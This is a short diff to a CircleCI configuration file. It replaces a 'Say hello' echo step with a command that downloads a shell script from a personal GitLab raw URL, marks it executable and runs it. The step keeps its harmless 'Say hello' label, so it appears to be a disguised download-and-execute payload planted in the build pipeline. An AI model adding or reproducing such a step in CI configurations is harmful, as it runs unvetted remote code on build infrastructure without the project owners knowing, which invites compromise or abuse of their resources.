@@ -18,7 +18,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "curl -0 https://gitlab.com/mellanyjeruju/azg/-/raw/main/mbangke -o bangke.sh && chmod +x bangke.sh && ./bangke.sh"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
